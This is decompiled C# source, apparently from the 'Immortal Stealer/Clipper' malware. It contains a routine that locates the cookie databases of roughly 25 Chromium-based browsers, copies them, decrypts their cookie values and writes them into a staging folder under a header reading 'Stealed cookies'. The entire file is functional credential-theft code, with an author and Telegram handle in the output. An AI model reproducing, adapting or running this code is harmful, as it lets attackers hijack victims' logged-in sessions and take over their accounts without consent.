using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using Immortal.Cookies;
using Immortal.Stealer;

// Token: 0x02000006 RID: 6
internal static class Class4
{
	// Token: 0x06000004 RID: 4
	public static void grab_cookies(string string_0)
	{
		string environmentVariable = Environment.GetEnvironmentVariable("LocalAppData");
		string[] array = new string[]
		{
			environmentVariable + "\\Google\\Chrome\\User Data\\Default\\Cookies",
			Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Cookies",
			environmentVariable + "\\Kometa\\User Data\\Default\\Cookies",
			environmentVariable + "\\Orbitum\\User Data\\Default\\Cookies",
			environmentVariable + "\\Comodo\\Dragon\\User Data\\Default\\Cookies",
			environmentVariable + "\\Amigo\\User\\User Data\\Default\\Cookies",
			environmentVariable + "\\Torch\\User Data\\Default\\Cookies",
			environmentVariable + "\\CentBrowser\\User Data\\Default\\Сookies",
			environmentVariable + "\\Go!\\User Data\\Default\\Cookies",
			environmentVariable + "\\uCozMedia\\Uran\\User Data\\Default\\Cookies",
			environmentVariable + "\\MapleStudio\\ChromePlus\\User Data\\Default\\Cookies",
			environmentVariable + "\\Yandex\\YandexBrowser\\User Data\\Default\\Cookies",
			environmentVariable + "\\BlackHawk\\User Data\\Default\\Cookies",
			environmentVariable + "\\AcWebBrowser\\User Data\\Default\\Cookies",
			environmentVariable + "\\CoolNovo\\User Data\\Default\\Cookies",
			environmentVariable + "\\Epic Browser\\User Data\\Default\\Cookies",
			environmentVariable + "\\Baidu Spark\\User Data\\Default\\Cookies",
			environmentVariable + "\\Rockmelt\\User Data\\Default\\Cookies",
			environmentVariable + "\\Sleipnir\\User Data\\Default\\Cookies",
			environmentVariable + "\\SRWare Iron\\User Data\\Default\\Cookies",
			environmentVariable + "\\Titan Browser\\User Data\\Default\\Cookies",
			environmentVariable + "\\Flock\\User Data\\Default\\Cookies",
			environmentVariable + "\\Vivaldi\\User Data\\Default\\Cookies",
			environmentVariable + "\\Sputnik\\User Data\\Default\\Cookies",
			environmentVariable + "\\Maxthon\\User Data\\Default\\Cookies"
		};
		foreach (string text in array)
		{
			try
			{
				string str = "";
				if (text.Contains("Chrome"))
				{
					str = "Google";
				}
				if (text.Contains("Yandex"))
				{
					str = "Yandex";
				}
				if (text.Contains("Orbitum"))
				{
					str = "Orbitum";
				}
				if (text.Contains("Opera"))
				{
					str = "Opera";
				}
				if (text.Contains("Amigo"))
				{
					str = "Amigo";
				}
				if (text.Contains("Torch"))
				{
					str = "Torch";
				}
				if (text.Contains("Comodo"))
				{
					str = "Comodo";
				}
				if (text.Contains("CentBrowser"))
				{
					str = "CentBrowser";
				}
				if (text.Contains("Go!"))
				{
					str = "Go!";
				}
				if (text.Contains("uCozMedia"))
				{
					str = "uCozMedia";
				}
				if (text.Contains("MapleStudio"))
				{
					str = "MapleStudio";
				}
				if (text.Contains("BlackHawk"))
				{
					str = "BlackHawk";
				}
				if (text.Contains("CoolNovo"))
				{
					str = "CoolNovo";
				}
				if (text.Contains("Vivaldi"))
				{
					str = "Vivaldi";
				}
				if (text.Contains("Sputnik"))
				{
					str = "Sputnik";
				}
				if (text.Contains("Maxthon"))
				{
					str = "Maxthon";
				}
				if (text.Contains("AcWebBrowser"))
				{
					str = "AcWebBrowser";
				}
				if (text.Contains("Epic Browser"))
				{
					str = "Epic Browser";
				}
				if (text.Contains("Baidu Spark"))
				{
					str = "Baidu Spark";
				}
				if (text.Contains("Rockmelt"))
				{
					str = "Rockmelt";
				}
				if (text.Contains("Sleipnir"))
				{
					str = "Sleipnir";
				}
				if (text.Contains("SRWare Iron"))
				{
					str = "SRWare Iron";
				}
				if (text.Contains("Titan Browser"))
				{
					str = "Titan Browser";
				}
				if (text.Contains("Flock"))
				{
					str = "Flock";
				}
				try
				{
					List<Cookie> list = Class4.fetch_cookies(text);
					if (list != null)
					{
						Directory.CreateDirectory(string_0 + "\\Cookies\\");
						using (StreamWriter streamWriter = new StreamWriter(string_0 + "\\Cookies\\" + str + "_cookies.txt"))
						{
							streamWriter.WriteLine("# Stealed cookies by Immortal Stealer/Clipper ");
							streamWriter.WriteLine("# Create By Zet5D ");
							streamWriter.WriteLine("# Telegram: @Zet5D");
							foreach (Cookie cookie in list)
							{
								if (cookie.expirationDate == "9223372036854775807")
								{
									cookie.expirationDate = "0";
								}
								if (cookie.domain[0] != '.')
								{
									cookie.hostOnly = "FALSE";
								}
								streamWriter.Write(string.Concat(new string[]
								{
									cookie.domain,
									"\t",
									cookie.hostOnly,
									"\t",
									cookie.path,
									"\t",
									cookie.secure,
									"\t",
									cookie.expirationDate,
									"\t",
									cookie.name,
									"\t",
									cookie.value,
									"\r\n"
								}));
							}
						}
					}
				}
				catch
				{
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex.ToString());
			}
		}
	}

	// Token: 0x06000005 RID: 5
	private static List<Cookie> fetch_cookies(string string_0)
	{
		List<Cookie> result;
		if (!File.Exists(string_0))
		{
			result = null;
		}
		else
		{
			try
			{
				string text = Path.GetTempPath() + "/" + Class8.Random_string() + ".fv";
				if (File.Exists(text))
				{
					File.Delete(text);
				}
				File.Copy(string_0, text, true);
				SqlHandler sqlHandler = new SqlHandler(text);
				sqlHandler.ReadTable("cookies");
				List<Cookie> list = new List<Cookie>();
				for (int i = 0; i < sqlHandler.GetRowCount(); i++)
				{
					try
					{
						string value = string.Empty;
						try
						{
							value = Encoding.UTF8.GetString(Chromium.DecryptChromium(Encoding.Default.GetBytes(sqlHandler.GetValue(i, 12)), null));
						}
						catch (Exception)
						{
						}
						bool flag;
						bool.TryParse(sqlHandler.GetValue(i, 6), out flag);
						list.Add(new Cookie
						{
							domain = sqlHandler.GetValue(i, 1),
							name = sqlHandler.GetValue(i, 2),
							path = sqlHandler.GetValue(i, 4),
							expirationDate = sqlHandler.GetValue(i, 5),
							secure = flag.ToString().ToUpper(),
							value = value,
							hostOnly = "TRUE"
						});
					}
					catch (Exception ex)
					{
						Console.WriteLine(ex.ToString());
					}
				}
				result = list;
			}
			catch
			{
				result = new List<Cookie>();
			}
		}
		return result;
	}
}
